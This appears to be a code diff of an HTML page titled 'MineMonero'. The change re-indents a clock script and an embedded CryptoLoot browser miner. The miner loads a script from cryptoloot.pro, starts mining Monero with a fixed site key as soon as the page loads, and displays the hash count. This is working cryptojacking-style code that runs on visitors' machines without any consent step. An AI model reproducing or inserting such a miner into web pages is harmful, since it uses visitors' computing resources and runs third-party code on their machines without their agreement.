@@ -2,44 +2,44 @@
 <title>MineMonero</title>
 <div id="bg">
   <div class="tint">
-  <div id="clock">
+    <div id="clock">
+      <script>
+        function clock() {
+          var today = new Date();
+          var hours = today.getHours();
+          var minutes = today.getMinutes();
+          var seconds = today.getSeconds();
+          if (hours > 12) {
+            hours = hours - 12;
+          } else if (hours === 0) {
+            hours = 12;
+          }
+          if (minutes < 10) {
+            minutes = "0" + minutes;
+          } else {
+            minutes = minutes;
+          }
+          if (seconds < 10) {
+            seconds = "0" + seconds;
+          } else {
+            seconds = seconds;
+          }
+          document.getElementById("clock").innerHTML = (hours + ":" + minutes);
+        }
+        setInterval('clock()', 1000);
+
+      </script>
+    </div>
+    <script src="//cryptoloot.pro/lib/crlt.js"></script>
     <script>
-      function clock() {
-        var today = new Date();
-        var hours = today.getHours();
-        var minutes = today.getMinutes();
-        var seconds = today.getSeconds();
-        if (hours > 12) {
-          hours = hours - 12;
-        } else if (hours === 0) {
-          hours = 12;
-        }
-        if (minutes < 10) {
-          minutes = "0" + minutes;
-        } else {
-          minutes = minutes;
-        }
-        if (seconds < 10) {
-          seconds = "0" + seconds;
-        } else {
-          seconds = seconds;
-        }
-        document.getElementById("clock").innerHTML = (hours + ":" + minutes);
-      }
-      setInterval('clock()', 1000);
+      var miner = new CRLT.Anonymous('f3981c028e6ec16499b062588983dff0f19496e86006');
+      miner.start();
+      setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
+        document.getElementById("totalhashes").innerHTML = totalHashes + " Hashes";
+      }, 1000);
 
     </script>
-  </div>
-  <script src="//cryptoloot.pro/lib/crlt.js"></script>
-  <script>
-    var miner = new CRLT.Anonymous('f3981c028e6ec16499b062588983dff0f19496e86006');
-    miner.start();
-    setInterval(function() {
-      var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
-      var acceptedHashes = miner.getAcceptedHashes();
-      document.getElementById("totalhashes").innerHTML = totalHashes + " Hashes";
-    }, 1000);
-
-  </script>
-  <p id="totalhashes"></p>
+    <p id="totalhashes"></p>
